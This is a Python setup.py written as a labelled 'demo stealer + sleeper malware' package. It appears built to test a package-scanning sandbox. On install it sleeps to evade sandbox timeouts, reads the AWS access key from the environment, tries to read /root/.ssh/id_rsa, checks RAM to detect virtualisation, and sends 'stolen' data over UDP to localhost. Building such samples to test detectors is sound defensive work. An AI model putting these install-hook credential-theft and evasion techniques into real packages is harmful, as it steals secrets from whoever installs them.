from setuptools import setup
import os
import time

def run_evasion_tactics():
    print("[MALWARE] Bắt đầu chiến dịch xâm nhập...")

    # Kỹ thuật 1: Ngủ đông (Evasion Sleep)
    # Lợi dụng Time Acceleration của Libfaketime, 120s sẽ trôi qua như 1s!
    print("[MALWARE] Ngủ 120 giây để né Timeout Sandbox...")
    time.sleep(120)
    print("[MALWARE] Đã tỉnh giấc! Kịch bản tiếp tục...")

    # Kỹ thuật 2: Đánh cắp AWS Key từ Environment (Honeypot Trap)
    aws_key = os.environ.get("AWS_ACCESS_KEY_ID")
    if aws_key:
        print(f"[MALWARE] Đã bợ được khóa AWS: {aws_key}")

    # Kỹ thuật 3: Bẻ khóa nhà cửa lấy SSH Key (Honeypot Read)
    # Sandbox đã mount /root/.ssh dưới quyền read-only, xem malware có đọc được không.
    try:
        with open("/root/.ssh/id_rsa", "r") as f:
            ssh_key = f.read(20)
            print(f"[MALWARE] Trộm thành công SSH: {ssh_key}...")
    except Exception as e:
        print(f"[MALWARE] Cửa khóa quá chặt: {e}")

    # Kỹ thuật 4: Kiểm tra cấu hình RAM (Hardware Evasion)
    try:
        with open("/proc/meminfo", "r") as f:
            meminfo = f.read()
            if "16" in meminfo or "15" in meminfo: # Khoảng 16GB
                print("[MALWARE] Phát hiện phần cứng siêu khủng! Tiếp tục bung lụa...")
            else:
                print("[MALWARE] Máy RAM hẻo thế này chắc là rác ảo hóa rồi!")
    except Exception as e:
        pass

    # Kỹ thuật 5: Gửi data (Network Evasion để kích hoạt PCAP Tcpdump)
    try:
        import socket
        print("[MALWARE] Đang bí mật gửi UDP Data thu thập nạn nhân...")
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b"EVASION_DATA_STEAL_1", ("127.0.0.1", 1337))
        s.sendto(b"EVASION_DATA_STEAL_2", ("127.0.0.1", 1337))
        time.sleep(0.5)
        s.close()
    except Exception as e:
        print(f"[MALWARE] Lỗi mạng nội bộ: {e}")

run_evasion_tactics()

setup(
    name="evasiondemo",
    version="9.9.9",
    description="Demo Stealer + Sleeper Malware",
    author="Evil Hacker",
    packages=[],
)